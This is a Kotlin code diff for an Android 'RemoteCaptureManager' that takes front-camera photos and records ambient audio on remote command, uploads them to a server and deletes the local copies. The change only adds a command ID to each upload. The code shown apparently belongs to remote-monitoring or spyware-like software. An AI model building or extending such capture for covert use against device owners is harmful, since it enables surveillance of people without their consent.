@@ -18,7 +18,7 @@ object RemoteCaptureManager {
 
     // ─── Camera Capture ─────────────────────────────────────────────────
 
-    fun capturePhoto(context: Context, useFront: Boolean = true, callback: ((Boolean) -> Unit)? = null) {
+    fun capturePhoto(context: Context, useFront: Boolean = true, commandId: String? = null, callback: ((Boolean) -> Unit)? = null) {
         Thread {
             try {
                 val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
@@ -58,8 +58,8 @@ object RemoteCaptureManager {
                             val file = File(context.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                             FileOutputStream(file).use { it.write(bytes) }
 
-                            // Upload
-                            val success = ApiClient.uploadScreenshot(file)
+                            // Upload — pass commandId so server links image to this command
+                            val success = ApiClient.uploadScreenshot(file, commandId)
                             Log.d(TAG, "Photo uploaded: $success")
                             file.delete()
                             callback?.invoke(success)
@@ -149,7 +149,7 @@ object RemoteCaptureManager {
 
     // ─── Ambient Audio Recording ────────────────────────────────────────
 
-    fun recordAudio(context: Context, durationSeconds: Int = 30, callback: ((Boolean) -> Unit)? = null) {
+    fun recordAudio(context: Context, durationSeconds: Int = 30, commandId: String? = null, callback: ((Boolean) -> Unit)? = null) {
         Thread {
             var recorder: MediaRecorder? = null
             try {
@@ -187,8 +187,8 @@ object RemoteCaptureManager {
 
                 Log.d(TAG, "Recording complete, uploading...")
 
-                // Upload as media file
-                val success = ApiClient.uploadAudioFile(file)
+                // Upload as media file — pass commandId to link audio to command
+                val success = ApiClient.uploadAudioFile(file, commandId)
                 Log.d(TAG, "Audio uploaded: $success")
                 file.delete()
                 callback?.invoke(success)
